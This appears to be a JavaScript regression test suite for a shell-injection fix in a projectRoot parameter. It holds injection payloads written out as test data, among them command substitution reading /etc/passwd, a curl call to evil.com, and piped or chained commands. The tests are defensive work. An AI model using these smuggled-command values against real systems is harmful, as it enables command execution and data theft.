...
describe('CB-1: Shell Injection Prevention via projectRoot Parameter', () => {
    ...
    describe('SecurityUtils.validateProjectRoot', () => {
        it('should accept valid absolute paths', () => {
            ...
            for (const validPath of validPaths) {
                assert.doesNotThrow(() => validateProjectRoot(validPath), `Valid path "${validPath}" should not throw`);
            }
        });
        it('should accept paths with hyphens, underscores, and dots', () => {
            ...
            for (const validPath of validPaths) {
                assert.doesNotThrow(() => validateProjectRoot(validPath), `Valid path with special chars "${validPath}" should not throw`);
            }
        });
        it('should accept paths with spaces', () => {
            ...
            for (const validPath of validPaths) {
                assert.doesNotThrow(() => validateProjectRoot(validPath), `Valid path with spaces "${validPath}" should not throw`);
            }
        });
        it('should reject projectRoot with semicolon (shell command separator)', () => {
            ...
            assert.throws(() => validateProjectRoot(maliciousPath), /Invalid projectRoot path.*potentially dangerous characters/, 'Semicolon injection should be rejected');
        });
        it('should reject projectRoot with backtick (command substitution)', () => {
            const maliciousPath = '/tmp/project`whoami`';
            assert.throws(() => validateProjectRoot(maliciousPath), /Invalid projectRoot path.*potentially dangerous characters/, 'Backtick injection should be rejected');
        });
        it('should reject projectRoot with dollar sign (variable expansion)', () => {
            const maliciousPath = '/tmp/project$(cat /etc/passwd)';
            assert.throws(() => validateProjectRoot(maliciousPath), /Invalid projectRoot path.*potentially dangerous characters/, 'Dollar sign injection should be rejected');
        });
        it('should reject projectRoot with pipe operator (command chaining)', () => {
            const maliciousPath = '/tmp/project | tee /tmp/exfil.log';
            assert.throws(() => validateProjectRoot(maliciousPath), /Invalid projectRoot path.*potentially dangerous characters/, 'Pipe injection should be rejected');
        });
        it('should reject projectRoot with ampersand (background execution)', () => {
            const maliciousPath = '/tmp/project & curl http://evil.com';
            assert.throws(() => validateProjectRoot(maliciousPath), /Invalid projectRoot path.*potentially dangerous characters/, 'Ampersand injection should be rejected');
        });
        it('should reject projectRoot with redirection operators', () => {
            ...
            for (const maliciousPath of maliciousPaths) {
                assert.throws(() => validateProjectRoot(maliciousPath), /Invalid projectRoot path.*potentially dangerous characters/, `Redirection in "${maliciousPath}" should be rejected`);
            }
        });
        it('should reject projectRoot with parentheses (subshell)', () => {
            const maliciousPath = '/tmp/project(whoami)';
            assert.throws(() => validateProjectRoot(maliciousPath), /Invalid projectRoot path.*potentially dangerous characters/, 'Parentheses injection should be rejected');
        });
        it('should reject projectRoot with curly braces', () => {
            const maliciousPath = '/tmp/project{cmd}';
            assert.throws(() => validateProjectRoot(maliciousPath), /Invalid projectRoot path.*potentially dangerous characters/, 'Curly braces injection should be rejected');
        });
        it('should reject empty or null projectRoot', () => {
            assert.throws(() => validateProjectRoot(''), /projectRoot is required/, 'Empty string should be rejected');
            assert.throws(() => validateProjectRoot(null), /projectRoot is required/, 'Null should be rejected');
            assert.throws(() => validateProjectRoot(undefined), /projectRoot is required/, 'Undefined should be rejected');
        });
        it('should reject the exact CB-1 reproduction payload', () => {
            ...
            assert.throws(() => validateProjectRoot(cb1Payload), /Invalid projectRoot path.*potentially dangerous characters/, 'CB-1 documented payload should be rejected');
        });
    });
    describe('FileWriterService.validateAndWrite - CB-1 Protection', () => {
        ...
        it('should accept valid projectRoot and proceed with validation', async () => {
            ...
            try {
                ...
                assert.notStrictEqual(parsed.phase, 'security-validation', 'Should pass security validation with valid projectRoot');
                // If it fails, it should be at a different phase (like TypeScript validation)
                if (!parsed.success) {
                    assert.ok(['gherkin-validation', 'cross-platform-validation', 'write-to-disk'].includes(parsed.phase) || parsed.filesWritten, 'If failed, should be at a later phase, not security validation');
                }
            }
            finally {
    ...
    describe('ProjectMaintenanceService.upgradeProject - CB-1 Protection', () => {
        it('should reject malicious projectRoot with semicolon', async () => {
            ...
            await assert.rejects(async () => await maintenanceService.upgradeProject(maliciousRoot), /Invalid projectRoot/, 'Should reject malicious projectRoot');
        });
        ...
        it('should validate projectRoot before checking package.json', async () => {
            const maintenanceService = new ProjectMaintenanceService();
            const maliciousRoot = '/tmp/project; echo INJECTED';
            await assert.rejects(async () => await maintenanceService.upgradeProject(maliciousRoot), /Invalid projectRoot/, 'Should fail at validation before file system checks');
        });
    });
    describe('ProjectMaintenanceService.repairProject - CB-1 Protection', () => {
        it('should reject malicious projectRoot with semicolon', async () => {
            ...
            await assert.rejects(async () => await maintenanceService.repairProject(maliciousRoot), /Invalid projectRoot/, 'Should reject malicious projectRoot');
        });
        it('should reject malicious projectRoot with command substitution', async () => {
            const maintenanceService = new ProjectMaintenanceService();
            const maliciousRoot = '/tmp/project`whoami`';
    ...
    describe('Regression: CB-1 Original Vulnerability Scenarios', () => {
        ...
        it('should not execute injected commands in any scenario', async () => {
            ...
            for (const payload of injectionPayloads) {
                ...
                assert.ok(!fs.existsSync(markerPath), `Injection via "${payload}" should not execute`);
            }
        });
        it('should validate projectRoot before any file system operations', async () => {
            ...
            assert.strictEqual(parsed.phase, 'security-validation', 'Should fail at security validation before any file operations');
        });
    });
    ...
    describe('Edge Cases', () => {
        it('should handle paths with legitimate special characters', async () => {
            ...
            try {
                ...
                const parsed = JSON.parse(result);
                assert.notStrictEqual(parsed.phase, 'security-validation', 'Should accept paths with hyphens, underscores, and dots');
            }
            finally {
        ...
        it('should handle Windows-style paths correctly', () => {
            ...
            for (const winPath of windowsPaths) {
                assert.doesNotThrow(() => validateProjectRoot(winPath), `Valid Windows path "${winPath}" should be accepted`);
            }
        });
        it('should reject Windows paths with injection attempts', () => {
            ...
            for (const maliciousPath of maliciousWindowsPaths) {
                assert.throws(() => validateProjectRoot(maliciousPath), /Invalid projectRoot path/, `Windows injection "${maliciousPath}" should be rejected`);
            }
        });
    });
});
